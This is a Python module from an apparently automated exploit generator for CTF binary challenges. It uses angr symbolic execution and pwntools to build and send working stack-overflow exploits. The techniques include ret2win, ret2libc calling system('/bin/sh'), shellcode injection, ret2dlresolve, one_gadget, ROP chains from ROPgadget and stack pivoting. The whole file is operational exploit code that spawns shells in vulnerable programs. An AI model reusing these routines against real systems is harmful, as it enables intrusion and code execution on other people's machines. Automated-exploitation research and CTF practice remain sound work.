from angr import SimUnsatError
from .challenge import Challenge
from .binary_interactive import InteractiveBinary
from .utils import *


class Exploit:
    def __init__(self, exploit_name, exploit_func, require_disabled_protections, required_information, least_width):
        # log.info(
        #     f'Load exploit: {exploit_name}, need binary without or bypassed {require_disabled_protections}, '
        #     f'need {required_information} and payload len at least {least_width}')
        self.exploit_name = exploit_name
        self.exploit_func = exploit_func
        self.require_disabled_protections = require_disabled_protections
        self.required_information = required_information
        self.least_width = least_width
        self.available = True

    def run(self, state_raw: angr.SimState, challenge: Challenge, new_mem: list):
        log.info(f"Trying exploit {self.exploit_name}")
        try:
            self.exploit_func(state_raw, challenge, new_mem, state_raw.globals['binary'])
        except SimUnsatError:
            log.failure(f"payload constraint unset")
        # except AttributeError:
        #     log.failure(f"payload gadget unset")
        self.available = False
        log.failure(f"Exploit {self.exploit_name} failed")

    def satisfy(self, binary: InteractiveBinary, try_lazy=False):
        if self.available:
            if 'lazy' in self.exploit_name and not try_lazy:
                return False
            if '_align' in self.exploit_name and binary.arch_bytes != 8:
                return False  # Since we do not trace the stack in shared libs, we need to consider the alignment
            return all([i in binary.io_seg_addr for i in self.required_information]) and \
                all([not binary.challenge.protection[i] for i in self.require_disabled_protections]) and \
                binary.payload_len >= binary.arch_bytes * self.least_width - 1


def init_exploits():
    log.info('Loading exploits.')
    return [
        Exploit('ret2win', ret2win, ['Canary'], ['text', 'win_func'], 1),
        Exploit('ret2win_align', ret2win_align, ['Canary'], ['text', 'win_func'], 1),
        Exploit('ret2backdoor', ret2backdoor, ['Canary'], ['text', 'backdoor', 'cmd_str'], 3),

        Exploit('ret2libc_align', ret2libc_align, ['Canary'], ['libc', 'dynamic'], 4),
        Exploit('ret2libc', ret2libc, ['Canary'], ['libc', 'dynamic'], 3),

        Exploit('jmp2shellcode', jmp2shellcode, ['Canary', 'NX'], ['text', 'jmp_esp'], 1),
        Exploit('ret2gg', ret2gg, ['Canary'], ['text', 'static'], 5),

        Exploit('lazy_ret2win_obo', ret2win_obo, ['Canary'], ['win_func'], 0),

        Exploit('lazy_ret2dl', ret2dl, ['Canary', 'RELRO'], ['text', 'dynamic'], 4),
        Exploit('lazy_rer2dl_align', ret2dl_align, ['Canary', 'RELRO'], ['text', 'dynamic'], 5),

        Exploit('lazy_ret2og', ret2og, ['Canary'], ['libc', 'dynamic'], 1),

        # Exploit('lazy_ret2stack', ret2stack, ['Canary', 'NX', 'PIE'], [], 4),
        Exploit('lazy_ret2shellcode', ret2shellcode, ['Canary', 'NX'], ['text'], 1),
    ]


def stack_pivot(state_raw: angr.SimState, challenge: Challenge, new_mem: list):
    state = state_raw.copy()
    binary = state_raw.globals['binary']
    rop_chain = ROP([challenge.target_binary])
    stack_addr = challenge.target_binary.bss() + 0x430
    arch_bytes = challenge.target_property['arch_bytes']
    rop_chain.raw(stack_addr - arch_bytes)
    try:
        if challenge.target_binary.functions.get('gets'):
            rop_chain.call('gets', [stack_addr])
        elif challenge.target_binary.functions.get('fgets'):
            rop_chain.call('fgets', [stack_addr, 0x630, 0])
        elif challenge.target_binary.functions.get('read'):
            rop_chain.call('read', [0, stack_addr, 0x630])
        else:
            return False
        leave_ret_addr = rop_chain.find_gadget(['leave', 'ret']).address
        rop_chain.raw(leave_ret_addr)
    except PwnlibException:
        return False
    payload = rop_chain.chain()
    constraints = [state.memory.load(new_mem[0] - arch_bytes, size=len(payload)) == payload]
    if state.solver.satisfiable(extra_constraints=constraints):
        for constraint in constraints:
            state.add_constraints(constraint)
        binary.warped_io_strip_zero(state, dump_payload(state, True))
        if not binary.check_alive():
            log.warning("Failed stack pivot")
            binary.close()
        else:
            return True


def ret2shellcode(state_raw: angr.SimState, challenge: Challenge, new_mem: list, binary: InteractiveBinary):
    bss_start = challenge.target_binary.bss()
    symbolic_list = [state_raw.memory.load(bss_start + x, size=1).symbolic for x in range(0x300)]
    if sum(symbolic_list) >= 24:
        pos, greatest_count = get_max_successive_symbolic_byte(symbolic_list)
        log.success(f"Found symbolic buffer at position {pos} of length {greatest_count}")
        if greatest_count >= 24:
            payload = get_shellcode(challenge.target_property)
            pos += bss_start
            offset = 0
            while offset + len(payload) < greatest_count:
                constraints = [
                    state_raw.memory.load(new_mem[0],
                                          size=challenge.target_property['arch_bytes']) == challenge.le(pos),
                    state_raw.memory.load(pos + offset, size=len(payload)) == payload
                ]
                if state_raw.solver.satisfiable(extra_constraints=constraints):
                    for constraint in constraints:
                        state_raw.add_constraints(constraint)
                    return binary.get_flag(state_raw, dump_payload(state_raw, True))
                else:
                    offset += len(payload)
    else:
        logging.warning("Too few symbolic bytes in bss, where can shellcode be placed?")


def jmp2shellcode(state_raw: angr.SimState, challenge: Challenge, new_mem: list, binary: InteractiveBinary):
    payload = get_shellcode(challenge.target_property)
    constraints = [state_raw.memory.load(new_mem[0], size=len(payload) + challenge.target_property['arch_bytes']) ==
                   challenge.le(binary.io_seg_addr['text'] + binary.io_seg_addr['jmp_esp']) + payload]
    for constraint in constraints:
        state_raw.add_constraints(constraint)
    binary.get_flag(state_raw, dump_payload(state_raw, True))


def ret2win(state_raw: angr.SimState, challenge: Challenge, new_mem: list, binary: InteractiveBinary, align_=False):
    for win_addr in binary.io_seg_addr.get('win_func'):
        log.info(f"Trying ret2win at {hex(win_addr)}")
        win_addr += binary.io_seg_addr['text']
        state = state_raw.copy()
        arch_bytes = challenge.target_property['arch_bytes']
        payload = challenge.le(win_addr)
        if align_:
            payload = challenge.le(challenge.rop.find_gadget(['ret']).address) + payload
        constraint = state.memory.load(new_mem[0], size=len(payload)) == payload
        # _bin = state.globals['binary']
        # constraint2 = state.memory.load(_bin.new_stack_symbol, size=arch_bytes) == challenge.le(_bin.new_stack_addr)
        if state.solver.satisfiable(extra_constraints=[constraint]):
            state.add_constraints(constraint)
            binary.get_flag(state_raw, dump_payload(state, False))


def ret2win_align(state: angr.SimState, challenge: Challenge, new_mem: list, binary: InteractiveBinary):
    ret2win(state, challenge, new_mem, binary, align_=True)


def ret2win_obo(state_raw: angr.SimState, challenge: Challenge, new_mem: list, binary: InteractiveBinary):
    for win_addr in binary.io_seg_addr.get('win_func'):
        if win_addr | 0xff == binary.rop_address | 0xff:
            log.info(f"Trying ret2win off-by-one at {hex(win_addr)}")
            state = state_raw.copy()
            constraint = state.memory.load(new_mem[0], size=1) == (win_addr & 0xff)
            if state.solver.satisfiable(extra_constraints=[constraint]):
                state.add_constraints(constraint)
                binary.get_flag(state_raw, dump_payload(state), has_newline=False)


def ret2og(state_raw: angr.SimState, challenge: Challenge, new_mem: list, binary: InteractiveBinary):
    one_gadgets = get_one_gadget(challenge)
    for one_gadget in one_gadgets:
        state = state_raw.copy()
        libc_base = binary.io_seg_addr['libc']
        log.info(f"Trying ret2og, with libc: {binary.libc} and base: {libc_base}")
        ret_addr = libc_base + one_gadget
        log.info(f"Set ret addr(OG) to {hex(ret_addr)}")
        constraint = state.memory.load(new_mem[0], size=challenge.target_property['arch_bytes']) == (
            challenge.le(ret_addr))
        if state.solver.satisfiable(extra_constraints=[constraint]):  # need to test real constraint for og
            state.add_constraints(constraint)
            binary.get_flag(state_raw, dump_payload(state, False))
            log.warning(f"Failed using og at {hex(one_gadget + libc_base)}, offset: {hex(one_gadget)}")
        binary.connect(state_raw)


def ret2libc(state: angr.SimState, challenge: Challenge, new_mem: list, binary: InteractiveBinary, align_=False):
    log.info(f"Test for libc_system{' align' if align_ else ''}, with libc: {challenge.target_property['libc']} "
             f"and base: {hex(binary.io_seg_addr['libc'])}")
    libc = ELF(challenge.target_property['libc'], checksec=False)
    libc.address = binary.io_seg_addr['libc']
    if challenge.target_property['arch_bytes'] == 4:
        payload = [libc.symbols['system'], 0, next(libc.search(b'/bin/sh\x00'))]
    else:
        rop_chain = ROP([libc])
        rop_chain.call('system', [next(libc.search(b'/bin/sh\x00'))])
        payload = rop_chain.chain()
        if align_:
            payload = p64(rop_chain.find_gadget(['pop rdi', 'ret']).address + 1) + payload
    state.add_constraints(state.memory.load(new_mem[0], size=len(payload)) == payload)
    binary.get_flag(state, dump_payload(state, True))


def ret2libc_align(state: angr.SimState, challenge: Challenge, new_mem: list, binary: InteractiveBinary):
    ret2libc(state, challenge, new_mem, binary, align_=True)


def ret2backdoor(state: angr.SimState, challenge: Challenge, new_mem: list, binary: InteractiveBinary):
    cmd_str = binary.io_seg_addr['cmd_str']
    log.info(f"Trying to call backdoor void(*)(void){hex(binary.io_seg_addr['backdoor'])}({hex(cmd_str)})")
    if challenge.target_property['arch_bytes'] == 4:
        payload = p32(binary.io_seg_addr['backdoor']) + p32(0) + p32(cmd_str)
    else:
        pop_rdi_ret = ROP(challenge.target_binary).find_gadget(['pop rdi', 'ret']).address
        payload = p64(pop_rdi_ret) + p64(cmd_str) + p64(binary.io_seg_addr['backdoor'])
    state.add_constraints(state.memory.load(new_mem[0], size=len(payload)) == payload)
    binary.get_flag(state, dump_payload(state, True))


def ret2dl(state: angr.SimState, challenge: Challenge, new_mem: list, binary: InteractiveBinary, align_=False):
    try:
        context.arch = challenge.target_property['arch']
        rop_chain = ROP([challenge.target_binary])

        dl_resolve = Ret2dlresolvePayload(challenge.target_binary, symbol="system", args=["/bin/sh"])

        # todo: rop_chain.call use template for the function call, we may use SE to find other gadget for the function call
        if "gets" in challenge.target_binary.got:
            rop_chain.call("gets", [dl_resolve.data_addr])
        elif "read" in challenge.target_binary.got:
            try:
                rop_chain.call("read", [0, dl_resolve.data_addr, len(dl_resolve.payload) + 1])
                _ = rop_chain.dump()
            except Exception:
                rop_chain = ROP([challenge.target_binary])
                rop_chain.call("read", [0, dl_resolve.data_addr])
                log.warning("read(0, addr, len) failed, trying read(0, addr)")
        else:
            log.warning("No gets or read function found in binary")
            return

        rop_chain.ret2dlresolve(dl_resolve)
        # log.info(f"dl-resolve rop chain gadgets and values: {rop_chain.dump()}")

        first_payload = rop_chain.chain()
        if align_:
            first_payload = p64(rop_chain.find_gadget(['pop rdi', 'ret']).address + 1) + first_payload
        state.solver.add(state.memory.load(new_mem[0], size=len(first_payload)) == first_payload)
        binary.send_payload(state, dump_payload(state, True))
        binary.get_flag(state, dl_resolve.payload)
    except PwnlibException:
        log.failure("dl-resolve function may not available.")


def ret2dl_align(state: angr.SimState, challenge: Challenge, new_mem: list, binary: InteractiveBinary):
    ret2dl(state, challenge, new_mem, binary, align_=True)


def ret2gg(state: angr.SimState, challenge: Challenge, new_mem: list, binary: InteractiveBinary):
    recv = subprocess.run(f"ROPgadget --binary {challenge.target_property['file']} --ropchain --silent",
                          stdout=subprocess.PIPE, shell=True).stdout
    if "Build the ROP chain" not in recv.decode():
        log.warning("Not found enough gadgets")
        return
    recv1 = recv[recv.find(b'from struct import pack'):].replace(b'\t', b'').replace(b'\t', b'').split(b'\n')
    addr = []
    for i in recv1:
        pattern_raw = re.search(b'\'(.*)\'', i)
        pattern_hex_addr = re.search(b" (0x[0-9a-f].*)\\)", i)
        if pattern_hex_addr:
            gg = int(pattern_hex_addr.group(1), 16) + binary.io_seg_addr['text']
            addr.append(challenge.le(gg))
        elif pattern_raw:
            addr.append(pattern_raw.group(1))
    addr = addr[1:]  # skip '' in the first
    payload = b''.join(addr)
    if len(new_mem) < len(payload) and stack_pivot(state, challenge, new_mem):
        log.info("Successfully stack pivot, trying ret2gadgets")
        binary.get_flag(state, payload)
    else:
        state.solver.add(state.memory.load(new_mem[0], size=len(payload)) == payload)
        binary.get_flag(state, dump_payload(state, True))
